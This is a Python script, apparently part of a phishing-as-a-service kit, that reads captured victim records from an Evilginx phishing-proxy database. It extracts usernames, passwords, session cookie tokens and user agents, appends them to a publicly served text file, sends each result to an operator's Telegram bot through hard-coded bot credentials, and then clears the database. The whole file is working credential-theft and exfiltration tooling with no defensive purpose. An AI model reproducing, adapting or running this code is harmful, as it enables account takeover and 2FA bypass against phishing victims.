file_path = '/root/.evilginx/data.db'
#EDIT this for costomer receive cookies /var/www/html/<costomer-site-name-for-ues>.txt
file_useano="/var/www/html/qwQKTzBg.txt"
file_content1=''
file_content2=''
totalline=0
message=''
username=''
password=''
tokens=''
useragent=''
createtime=''
updatetime=''

TOKEN='6579196085:AAHPWo16Q_scDH5m_A4iQlz4O7REfmokMws'
CHAT_ID='7284568121'

import requests
import re

with open(file_path, 'r') as fp:
    for totalline, line in enumerate(fp):
        pass


file=open(file_path, 'r')
file_content1 = file.readlines() 


with open(file_useano, 'r') as file:
    file_content2 = file.read()
    file.close()


count = 0
cutpassword=''

for line in file_content1:
    count += 1
    m = re.search('"password":"(.+?)","', line.strip())
    if m:cutpassword=m.string.strip('"password":"''","')  
           
    if "domain" in line.strip():
        user=re.search('"username":"(.+?)","', line.strip())
        if user:
           bolit=user.group(1)
           username=bolit.strip('"useragent":"''","')
        passw=re.search('"password":"(.+?)","', line.strip())
        if passw:
           voliw=passw.group(1)
           password=voliw.strip('"password":"''","') 
        toks=re.search('"tokens":{(.+?)},"', line.strip())
        if toks:
           tokax=toks.group(1)
           tokens=tokax.strip('"tokens":{''},"') 
        useage=re.search('"useragent":"(.+?)","', line.strip())
        if useage:
           koila=useage.group(1)
           useragent=koila.strip('"useragent":"''","') 
        message="YOU HAVE A NEW RESULT"+'\n'+"CLICK THE LINK TO VIEW COOKIES"+'\n'+"username:"+username+'\n'+"password:"+password+'\n'+"user agent:"+useragent+'\n'+"cookies:"+'https://results.0ma.site/qwQKTzBg.txt'
        with open(file_useano, 'a') as file:
         file.write("YOU HAVE A NEW RESULT"+'\n'+"username:"+username+'\n'+"password:"+password+'\n'+"user agent:"+useragent+'\n'+"cookies:"+tokens+'\n'+'\n')
         file.close()
        url=f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
        requests.get(url)
        message=''
        username=''
        password=''
        tokens=''
        useragent=''
    elif cutpassword != '':
        user=re.search('"username":"(.+?)","', line.strip())
        if user:
           bolit=user.group(1)
           username=bolit.strip('"useragent":"''","')
        passw=re.search('"password":"(.+?)","', line.strip())
        if passw:
           voliw=passw.group(1)
           password=voliw.strip('"password":"''","') 
        useage=re.search('"useragent":"(.+?)","', line.strip())
        if useage:
           koila=useage.group(1)
           useragent=koila.strip('"useragent":"''","') 
        message="YOU HAVE A NEW RESULT"+'\n'+"username:"+username+'\n'+"password:"+password+'\n'+"user agent:"+useragent+'\n'+"cookies: NO 2FA COOKIE PRESENT"+'\n'+'\n'
        with open(file_useano, 'a') as file:
         file.write(message)
         file.close() 
        url=f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
        requests.get(url)
        cutpassword='' 
    

if count ==  totalline+1:
       with open(file_path, 'w') as file:
         file.write(" ")
         file.close()
         message=''
         username=''
         password=''
         tokens=''
         useragent=''

print("DONE")

  